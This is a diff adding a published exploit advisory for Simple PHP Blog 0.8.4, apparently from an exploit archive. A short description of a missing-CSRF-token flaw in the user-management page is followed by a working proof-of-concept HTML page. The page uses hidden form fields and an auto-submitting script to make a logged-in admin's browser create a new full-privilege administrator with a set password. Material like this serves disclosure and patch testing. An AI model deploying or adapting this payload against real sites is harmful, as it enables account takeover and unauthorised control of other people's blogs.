@@ -1,0 +1,66 @@
+<!--
+
+=========================================================================================================
+Simple PHP Blog 0.8.4 - Cross-Site Request Forgery (Add Admin)
+=========================================================================================================
+
+# Exploit Title: Simple PHP Blog 0.8.4 - Cross-Site Request Forgery (Add
+Admin)
+# Author: Besim
+# Google Dork: -
+# Date: 07/10/2016
+# Type: webapps
+# Platform : PHP
+# Vendor Homepage: http://simpleblogphp.com/
+# Software Link: https://sourceforge.net/projects/sphpblog/
+# Version: 0.8.4
+# Tested on: Ubuntu 14.04.5
+
+Simple PHP Blog 0.8.4 versions is vulnerable to CSRF attack (No CSRF token
+in place)
+meaning that if an admin user can be tricked to visit a crafted URL created
+by
+attacker (via spear phishing/social engineering), a form will be submitted
+to (*http://localhost/simple/manage_users.php?action=update&type=new
+<http://localhost/simple/manage_users.php?action=update&type=new>*) that
+will add a new user as administrator.
+
+Once exploited, the attacker can login to the admin panel
+(*http://localhost/simple/login.php <http://localhost/simple/login.php>*)
+using the username and the password he posted in the form.
+
+*CSRF PoC Code*
+=============
+
+-->
+
+<html>
+  <body>
+    <form action="
+http://localhost/simple/manage_users.php?action=update&type=new"
+method="POST">
+      <input type="hidden" name="sUsername" value="Besim" />
+      <input type="hidden" name="sFullname" value="Besim" />
+      <input type="hidden" name="sPassword" value="mehmet" />
+      <input type="hidden" name="sEmail" value="mehmet&#64;yopmail&#46;com"
+/>
+      <input type="hidden" name="sAvatar" value="" />
+      <input type="hidden" name="sActive" value="on" />
+      <input type="hidden" name="sModComments" value="on" />
+      <input type="hidden" name="sDeleteEntries" value="on" />
+      <input type="hidden" name="sEditAny" value="on" />
+      <input type="hidden" name="submit" value="Create&#32;User" />
+      <input type="submit" value="Submit request" />
+    </form>
+    <script>
+      document.forms[0].submit();
+    </script>
+  </body>
+</html>
+
+
+
+
+-- 
+
+Besim ALTiNOK
